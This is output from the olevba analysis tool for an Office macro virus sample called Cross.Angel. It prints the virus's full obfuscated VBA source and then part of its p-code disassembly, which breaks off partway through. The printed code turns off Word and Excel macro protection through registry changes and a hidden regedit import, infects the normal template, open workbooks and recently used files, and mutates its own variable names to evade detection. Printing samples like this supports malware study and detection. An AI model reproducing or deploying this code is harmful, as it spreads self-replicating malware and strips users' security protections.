olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Across.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Across.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Cross.Angel
Private Sub Document_Close()
On Error Resume Next
Const ž»§–Ê = "' Cross.Angel", …·µ¶Š = 130, ‡š…©® = "9.0", ª’¼¹® = "Macro", »–Šš¦ = "Tools", µžŠª¯ = &H1, µžŠª¯_ = &H0, ¸‡Â”“ = 0, ª¾±³· = 1, „Â©¶° = 12, ·˜¯¨¦ = "excel.application", È‡‰ƒ· = "DieseArbeitsmappe"
If Application.Version = ‡š…©® Then
    Application.CommandBars(ª’¼¹®).Controls((ª¾±³· + ª¾±³· + ª¾±³·)).Enabled = (Rnd * ¸‡Â”“)
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = µžŠª¯
Else
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = µžŠª¯_
    Application.CommandBars(»–Šš¦).Controls(„Â©¶°).Enabled = (Rnd * ¸‡Â”“)
    Options.VirusProtection = (Rnd * ¸‡Â”“)
End If
Options.SaveNormalPrompt = (Rnd * ¸‡Â”“)
È¹Ž±¦ = ½‘ˆ²†(ThisDocument.VBProject.VBComponents(ª¾±³·).CodeModule.Lines(ª¾±³·, …·µ¶Š))
If MacroContainer = ActiveDocument Then Set ÈŽ‡Œ” = NormalTemplate Else Set ÈŽ‡Œ” = ActiveDocument
With ÈŽ‡Œ”.VBProject.VBComponents(ª¾±³·).CodeModule
    If .Lines(ª¾±³·, ª¾±³·) <> ž»§–Ê Then
        .DeleteLines ª¾±³·, .CountOfLines
        .InsertLines ª¾±³·, È¹Ž±¦
        If ÈŽ‡Œ” = ActiveDocument Then ActiveDocument.SaveAs ActiveDocument.FullName
    End If
End With
If System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") <> ª¾±³· Then
Set ÈÅ”›² = GetObject(, ·˜¯¨¦)
If ÈÅ”›² = "" Then Set ÈÅ”›² = CreateObject(·˜¯¨¦): ˆŽ£È« = ª¾±³·
If ˆŽ£È« <> ª¾±³· Then
    For Each À˜Êƒˆ In ÈÅ”›².Workbooks
       With À˜Êƒˆ.VBProject.VBComponents(È‡‰ƒ·).CodeModule
            If .Lines(ª¾±³·, ª¾±³·) <> ž»§–Ê Then
                .DeleteLines ª¾±³·, .CountOfLines
                .InsertLines ª¾±³·, È¹Ž±¦
                If À˜Êƒˆ.Path <> "" Then À˜Êƒˆ.Save Else À˜Êƒˆ.SaveAs À˜Êƒˆ.FullName
            End If
        End With
    Next
Else
    For À˜Êƒˆ = ª¾±³· To ÈÅ”›².Application.RecentFiles.Maximum
        ÈÅ”›².Application.RecentFiles(À˜Êƒˆ).Open
            With ÈÅ”›².Application.Workbooks(Application.RecentFiles(1).Name).VBProject.VBComponents(È‡‰ƒ·).CodeModule
                If .Lines(ª¾±³·, ª¾±³·) <> ž»§–Ê Then
                    .DeleteLines ª¾±³·, .CountOfLines
                    .InsertLines ª¾±³·, È¹Ž±¦
                End If
            End With
        ÈÅ”›².Application.Workbooks(Application.RecentFiles(1).Name).Close ª¾±³·
    Next
    ÈÅ”›².Quit
End If
System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") = ª¾±³·
End If
If Minute(Now()) = Int(Rnd * 60) + 1 Then MsgBox "Why I lost my angel? Can't live without you!", vbQuestion, "Cross.Angel by jackie-/Lz0NT/MVT"
If System.PrivateProfileString("c:\.ini", "Carinthia", "Word") <> ª¾±³· Then System.PrivateProfileString("c:\.ini", "Carinthia", "Word") = ª¾±³·
End Sub
Private Sub Workbook_Deactivate()
On Error Resume Next
Const ž»§–Ê = "' Cross.Angel", …·µ¶Š = 130, ‡š…©® = "9.0", ª’¼¹® = "Macro", »–Šš¦ = "Tools", ¸‡Â”“ = 0, ª¾±³· = 1, „Â©¶° = 10, ·˜¯¨¦ = "word.application", È‡‰ƒ· = "DieseArbeitsmappe"
If UCase(Dir("c:\.reg")) <> ".REG" Then
Open "c:\.reg" For Output As #1
    Print #1, "REGEDIT4"
If Application.Version = ‡š…©® Then
    Application.CommandBars(ª’¼¹®).Controls((ª¾±³· + ª¾±³· + ª¾±³·)).Enabled = (Rnd * ¸‡Â”“)
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
    Print #1, """Level""=dword:00000001"
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
    Print #1, """Level""=dword:00000001"
Else
    Application.CommandBars(»–Šš¦).Controls(„Â©¶°).Enabled = (Rnd * ¸‡Â”“)
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
    Print #1, """Options6""=dword:00000000"
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]"
    Print #1, """EnableMacroVirusProtection""=""0"""
End If
Close #1
End If
Shell "regedit /s c:\.reg", vbHide
È¹Ž±¦ = ½‘ˆ²†(ThisWorkbook.VBProject.VBComponents(È‡‰ƒ·).CodeModule.Lines(ª¾±³·, …·µ¶Š))
For Each À˜Êƒˆ In Application.Workbooks
    With À˜Êƒˆ.VBProject.VBComponents(È‡‰ƒ·).CodeModule
        If .Lines(ª¾±³·, ª¾±³·) <> ž»§–Ê Then
            .DeleteLines ª¾±³·, .CountOfLines
            .InsertLines ª¾±³·, È¹Ž±¦
            If À˜Êƒˆ.Path <> "" Then À˜Êƒˆ.Save Else À˜Êƒˆ.SaveAs À˜Êƒˆ.FullName
        End If
    End With
Next
If Application.Workbooks.Count = ª¾±³· Then
    Application.WindowState = xlMinimized
    For À˜Êƒˆ = ª¾±³· To Application.RecentFiles.Maximum
        Application.RecentFiles(À˜Êƒˆ).Open
            With Application.Workbooks(Application.RecentFiles(1).Name).VBProject.VBComponents(È‡‰ƒ·).CodeModule
                If .Lines(ª¾±³·, ª¾±³·) <> ž»§–Ê Then
                    .DeleteLines ª¾±³·, .CountOfLines
                    .InsertLines ª¾±³·, È¹Ž±¦
                End If
            End With
        Application.Workbooks(Application.RecentFiles(1).Name).Close ª¾±³·
    Next
End If
Set ÈÅ”›² = GetObject(, ·˜¯¨¦)
If ÈÅ”›² = "" Then Set ÈÅ”›² = CreateObject(·˜¯¨¦): ˆŽ£È« = ª¾±³·
If ÈÅ”›².System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") <> ª¾±³· Then ÈÅ”›².System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") = ª¾±³·
If ÈÅ”›².System.PrivateProfileString("c:\.ini", "Carinthia", "Word") <> ª¾±³· Then
With ÈÅ”›².NormalTemplate.VBProject.VBComponents(ª¾±³·).CodeModule
    If .Lines(ª¾±³·, ª¾±³·) <> ž»§–Ê Then
        .DeleteLines ª¾±³·, .CountOfLines
        .InsertLines ª¾±³·, È¹Ž±¦
        ÈÅ”›².NormalTemplate.Save
        ÈÅ”›².System.PrivateProfileString("c:\.ini", "Carinthia", "Word") = ª¾±³·
    End If
End With
End If
If ˆŽ£È« = ª¾±³· Then ÈÅ”›².Quit Else If Minute(Now()) = Int(Rnd * 60) + 1 Then MsgBox "Why I lost my angel? Can't live without you!", vbQuestion, "Cross.Angel by jackie-/Lz0NT/MVT"
End Sub
Private Function ½‘ˆ²†(È¹Ž±¦) 'JSMP v1.2
Dim £µŠ‰œ(0 To 20): Randomize
¨¸¸‘Š = 1: £µŠ‰œ(0) = "È¹Ž±¦": £µŠ‰œ(1) = "½‘ˆ²†": £µŠ‰œ(2) = "£µŠ‰œ": £µŠ‰œ(3) = "Š¸¾¯˜": £µŠ‰œ(4) = "£…†Ã�": £µŠ‰œ(5) = "¨¸¸‘Š": £µŠ‰œ(6) = "ž»§–Ê": £µŠ‰œ(7) = "…·µ¶Š": £µŠ‰œ(8) = "‡š…©®": £µŠ‰œ(9) = "ª’¼¹®": £µŠ‰œ(10) = "»–Šš¦": £µŠ‰œ(11) = "µžŠª¯": £µŠ‰œ(12) = "¸‡Â”“": £µŠ‰œ(13) = "ª¾±³·": £µŠ‰œ(14) = "„Â©¶°": £µŠ‰œ(15) = "·˜¯¨¦": £µŠ‰œ(16) = "È‡‰ƒ·": £µŠ‰œ(17) = "ÈŽ‡Œ”": £µŠ‰œ(18) = "ÈÅ”›²": £µŠ‰œ(19) = "ˆŽ£È«": £µŠ‰œ(20) = "À˜Êƒˆ"
For Š¸¾¯˜ = 0 To 20
£…†Ã� = Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74))
Do
¨¸¸‘Š = InStr(¨¸¸‘Š + 1, È¹Ž±¦, £µŠ‰œ(Š¸¾¯˜))
If ¨¸¸‘Š Then È¹Ž±¦ = Mid(È¹Ž±¦, 1, (¨¸¸‘Š - 1)) & £…†Ã� & Mid(È¹Ž±¦, (¨¸¸‘Š + Len(£µŠ‰œ(Š¸¾¯˜))), Len(È¹Ž±¦))
Loop While ¨¸¸‘Š
Next
½‘ˆ²† = È¹Ž±¦
End Function
'Cross.Angel written by jackie twoflower /Lz0NT /MVT
'Uses Jackie's Stupid Macro Poly v1.2
'Office97 and Office2000 compatible | New Cross area!
'Hey my angel, this is for you. Why you left me?
'I can't live without you! I luv ya!
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSOffice.Across.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11615 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000C " Cross.Angel"
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Dim (Const) 
' 	LitStr 0x000D "' Cross.Angel"
' 	VarDefn ž»§–Ê
' 	LitDI2 0x0082 
' 	VarDefn …·µ¶Š
' 	LitStr 0x0003 "9.0"
' 	VarDefn ‡š…©®
' 	LitStr 0x0005 "Macro"
' 	VarDefn ª’¼¹®
' 	LitStr 0x0005 "Tools"
' 	VarDefn »–Šš¦
' 	LitHI2 0x0001 
' 	VarDefn µžŠª¯
' 	LitHI2 0x0000 
' 	VarDefn µžŠª¯_
' 	LitDI2 0x0000 
' 	VarDefn ¸‡Â”“
' 	LitDI2 0x0001 
' 	VarDefn ª¾±³·
' 	LitDI2 0x000C 
' 	VarDefn „Â©¶°
' 	LitStr 0x0011 "excel.application"
' 	VarDefn ·˜¯¨¦
' 	LitStr 0x0011 "DieseArbeitsmappe"
' 	VarDefn È‡‰ƒ·
' Line #4:
' 	Ld Application 
' 	MemLd Version 
' 	Ld ‡š…©® 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	Ld Rnd 
' 	Ld ¸‡Â”“ 
' 	Mul 
' 	Paren 
' 	Ld ª¾±³· 
' 	Ld ª¾±³· 
' 	Add 
' 	Ld ª¾±³· 
' 	Add 
' 	Paren 
' 	Ld ª’¼¹® 
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #6:
' 	Ld µžŠª¯ 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #7:
' 	ElseBlock 
' Line #8:
' 	Ld µžŠª¯_ 
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #9:
' 	Ld Rnd 
' 	Ld ¸‡Â”“ 
' 	Mul 
' 	Paren 
' 	Ld „Â©¶° 
' 	Ld »–Šš¦ 
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #10:
' 	Ld Rnd 
' 	Ld ¸‡Â”“ 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	Ld Rnd 
' 	Ld ¸‡Â”“ 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #13:
' 	Ld ª¾±³· 
' 	Ld …·µ¶Š 
' 	Ld ª¾±³· 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd ½‘ˆ²† 0x0001 
' 	St È¹Ž±¦ 
' Line #14:
' 	Ld MacroContainer 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set ÈŽ‡Œ” 
' 	Else 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ÈŽ‡Œ” 
' 	EndIf 
' Line #15:
' 	StartWithExpr 
' 	Ld ª¾±³· 
' 	Ld ÈŽ‡Œ” 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #16:
' 	Ld ª¾±³· 
' 	Ld ª¾±³· 
' 	ArgsMemLdWith Lines 0x0002 
' 	Ld ž»§–Ê 
' 	Ne 
' 	IfBlock 
' Line #17:
' 	Ld ª¾±³· 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #18:
' 	Ld ª¾±³· 
' 	Ld È¹Ž±¦ 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #19:
' 	Ld ÈŽ‡Œ” 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	EndWith 
' Line #22:
' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0005 "Excel"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld ª¾±³· 
' 	Ne 
' 	IfBlock 
' Line #23:
' 	SetStmt 
' 	ParamOmitted 
' 	Ld ·˜¯¨¦ 
' 	ArgsLd GetObject 0x0002 
' 	Set ÈÅ”›² 
' Line #24:
' 	Ld ÈÅ”›² 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ·˜¯¨¦ 
' 	ArgsLd CreateObject 0x0001 
' 	Set ÈÅ”›² 
' 	BoS 0x0000 
' 	Ld ª¾±³· 
' 	St ˆŽ£È« 
' 	EndIf 
' Line #25:
' 	Ld ˆŽ£È« 
' 	Ld ª¾±³· 
' 	Ne 
' 	IfBlock 
' Line #26:
' 	StartForVariable 
' 	Ld À˜Êƒˆ 
' 	EndForVariable 
' 	Ld ÈÅ”›² 
' 	MemLd Workbooks 
' 	ForEach 
' Line #27:
' 	StartWithExpr 
' 	Ld È‡‰ƒ· 
' 	Ld À˜Êƒˆ 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #28:
' 	Ld ª¾±³· 
' 	Ld ª¾±³· 
' 	ArgsMemLdWith Lines 0x0002 
' 	Ld ž»§–Ê 
' 	Ne 
' 	IfBlock 
' Line #29:
' 	Ld ª¾±³· 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #30:
' 	Ld ª¾±³· 
' 	Ld È¹Ž±¦ 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #31:
' 	Ld À˜Êƒˆ 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld À˜Êƒˆ 
' 	ArgsMemCall Save 0x0000 
' 	Else 
' 	BoSImplicit 
' 	Ld À˜Êƒˆ 
' 	MemLd FullName 
' 	Ld À˜Êƒˆ 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	EndWith 
' Line #34:
' 	StartForVariable 
' 	Next 
' Line #35:
' 	ElseBlock 
' Line #36:
' 	StartForVariable 
' 	Ld À˜Êƒˆ 
' 	EndForVariable 
' 	Ld ª¾±³· 
' 	Ld ÈÅ”›² 
' 	MemLd Application 
' 	MemLd RecentFiles 
' 	MemLd Maximum 
' 	For 
' Line #37:
' 	Ld À˜Êƒˆ 
' 	Ld ÈÅ”›² 
' 	MemLd Application 
' 	ArgsMemLd RecentFiles 0x0001 
' 	ArgsMemCall Option 0x0000 
' Line #38:
' 	StartWithExpr 
' 	Ld È‡‰ƒ· 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd RecentFiles 0x0001 
' 	MemLd New 
' 	Ld ÈÅ”›² 
' 	MemLd Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #39:
' 	Ld ª¾±³· 
' 	Ld ª¾±³· 
' 	ArgsMemLdWith Lines 0x0002 
' 	Ld ž»§–Ê 
' 	Ne 
' 	IfBlock 
' Line #40:
' 	Ld ª¾±³· 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #41:
' 	Ld ª¾±³· 
' 	Ld È¹Ž±¦ 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	EndWith 
' Line #44:
' 	Ld ª¾±³· 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd RecentFiles 0x0001 
' 	MemLd New 
' 	Ld ÈÅ”›² 
' 	MemLd Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #45:
' 	StartForVariable 
' 	Next 
' Line #46:
' 	Ld ÈÅ”›² 
' 	ArgsMemCall Quit 0x0000 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	Ld ª¾±³· 
' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0005 "Excel"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x003C 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x002C "Why I lost my angel? Can't live without you!"
' 	Ld vbQuestion 
' 	LitStr 0x0020 "Cross.Angel by jackie-/Lz0NT/MVT"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #51:
' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0004 "Word"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld ª¾±³· 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ª¾±³· 
' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0004 "Word"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #52:
' 	EndSub 
' Line #53:
' 	FuncDefn (Private Sub Workbook_Deactivate())
' Line #54:
' 	OnError (Resume Next) 
' Line #55:
' 	Dim (Const) 
' 	LitStr 0x000D "' Cross.Angel"
' 	VarDefn ž»§–Ê
' 	LitDI2 0x0082 
' 	VarDefn …·µ¶Š
' 	LitStr 0x0003 "9.0"
' 	VarDefn ‡š…©®
' 	LitStr 0x0005 "Macro"
' 	VarDefn ª’¼¹®
' 	LitStr 0x0005 "Tools"
' 	VarDefn »–Šš¦
' 	LitDI2 0x0000 
' 	VarDefn ¸‡Â”“
' 	LitDI2 0x0001 
' 	VarDefn ª¾±³·
' 	LitDI2 0x000A 
' 	VarDefn „Â©¶°
' 	LitStr 0x0010 "word.application"
' 	VarDefn ·˜¯¨¦
' 	LitStr 0x0011 "DieseArbeitsmappe"
' 	VarDefn È‡‰ƒ·
' Line #56:
' 	LitStr 0x0007 "c:\.reg"
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0004 ".REG"
' 	Ne 
' 	IfBlock 
' Line #57:
' 	LitStr 0x0007 "c:\.reg"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "REGEDIT4"
' 	PrintItemNL 
' Line #59:
' 	Ld Application 
' 	MemLd Version 
' 	Ld ‡š…©® 
' 	Eq 
' 	IfBlock 
' Line #60:
' 	Ld Rnd 
' 	Ld ¸‡Â”“ 
' 	Mul 
' 	Paren 
' 	Ld ª¾±³· 
' 	Ld ª¾±³· 
' 	Add 
' 	Ld ª¾±³· 
' 	Add 
' 	Paren 
' 	Ld ª’¼¹® 
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #61:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0040 "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
' 	PrintItemNL 
' Line #62:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 ""Level"=dword:00000001"
' 	PrintItemNL 
' Line #63:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003F "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
' 	PrintItemNL 
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 ""Level"=dword:00000001"
' 	PrintItemNL 
' Line #65:
' 	ElseBlock 
' Line #66:
' 	Ld Rnd 
' 	Ld ¸‡Â”“ 
' 	Mul 
' 	Paren 
' 	Ld „Â©¶° 
' 	Ld »–Šš¦ 
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
' 	PrintItemNL 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003E "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]"
' 	PrintItemNL 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 ""EnableMacroVirusProtection"="0""
' 	PrintItemNL 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	LitStr 0x0012 "regedit /s c:\.reg"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #75:
' 	Ld ª¾±³· 
' 	Ld …·µ¶Š 
' 	Ld È‡‰ƒ· 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd ½‘ˆ²† 0x0001 
' 	St È¹Ž±¦ 
' Line #76:
' 	StartForVariable 
' 	Ld À˜Êƒˆ 
' 	EndForVariable 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ForEach 
' Line #77:
' 	StartWithExpr 
' 	Ld È‡‰ƒ· 
' 	Ld À˜Êƒˆ 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #78:
' 	Ld ª¾±³· 
' 	Ld ª¾±³· 
' 	ArgsMemLdWith Lines 0x0002 
' 	Ld ž»§–Ê 
' 	Ne 
' 	IfBlock 
' Line #79:
' 	Ld ª¾±³· 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #80:
' 	Ld ª¾±³· 
' 	Ld È¹Ž±¦ 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #81:
' 	Ld À˜Êƒˆ 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld À˜Êƒˆ 
' 	ArgsMemCall Save 0x0000 
' 	Else 
' 	BoSImplicit 
' 	Ld À˜Êƒˆ 
' 	MemLd FullName 
' 	Ld À˜Êƒˆ 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	EndWith 
' Line #84:
' 	StartForVariable 
' 	Next 
' Line #85:
' 	Ld Application 
' 	MemLd Workbooks 
' 	MemLd Count 
' 	Ld ª¾±³· 
' 	Eq 
' 	IfBlock 
' Line #86:
' 	Ld xlMinimized 
' 	Ld Application 
' 	MemSt WindowState 
' Line #87:
' 	StartForVariable 
' 	Ld À˜Êƒˆ 
' 	EndForVariable 
' 	Ld ª¾±³· 
' 	Ld Application 
' 	MemLd RecentFiles 
' 	MemLd Maximum 
' 	For 
' Line #88:
' 	Ld À˜Êƒˆ 
' 	Ld Application 
' 	ArgsMemLd RecentFiles 0x0001 
' 	ArgsMemCall Option 0x0000 
' Line #89:
' 	StartWithExpr 
' 	Ld È‡‰ƒ· 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd RecentFiles 0x0001 
' 	MemLd New 
' 	Ld Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #90:
' 	Ld ª¾±³· 
' 	Ld ª¾±³· 
' 	ArgsMemLdWith Lines 0x0002 
' 	Ld ž»§–Ê 
' 	Ne 
' 	IfBlock 
' Line #91:
' 	Ld ª¾±³· 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #92:
' 	Ld ª¾±³· 
' 	Ld È¹Ž±¦ 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	EndWith 
' Line #95:
' 	Ld ª¾±³· 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd RecentFiles 0x0001 
' 	MemLd New 
' 	Ld Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #96:
' 	StartForVariable 
' 	Next 
' Line #97:
' 	EndIfBlock 
' Line #98:
' 	SetStmt 
' 	ParamOmitted 
' 	Ld ·˜¯¨¦ 
' 	ArgsLd GetObject 0x0002 
' 	Set ÈÅ”›² 
' Line #99:
' 	Ld ÈÅ”›² 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ·˜¯¨¦ 
' 	ArgsLd CreateObject 0x0001 
' 	Set ÈÅ”›² 
' 	BoS 0x0000 
' 	Ld ª¾±³· 
' 	St ˆŽ£È« 
' 	EndIf 
' Line #100:
' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0005 "Excel"
' 	Ld ÈÅ”›² 
' 	MemLd System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld ª¾±³· 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ª¾±³· 
' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0005 "Excel"
' 	Ld ÈÅ”›² 
' 	MemLd System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #101:
' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0004 "Word"
' 	Ld ÈÅ”›² 
' 	MemLd System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld ª¾±³· 
' 	Ne 
' 	IfBlock 
' Line #102:
' 	StartWithExpr 
' 	Ld ª¾±³· 
' 	Ld ÈÅ”›² 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #103:
' 	Ld ª¾±³· 
' 	Ld ª¾±³· 
' 	ArgsMemLdWith Lines 0x0002 
' 	Ld ž»§–Ê 
' 	Ne 
' 	IfBlock 
' Line #104:
' 	Ld ª¾±³· 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #105:
' 	Ld ª¾±³· 
' 	Ld È¹Ž±¦ 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #106:
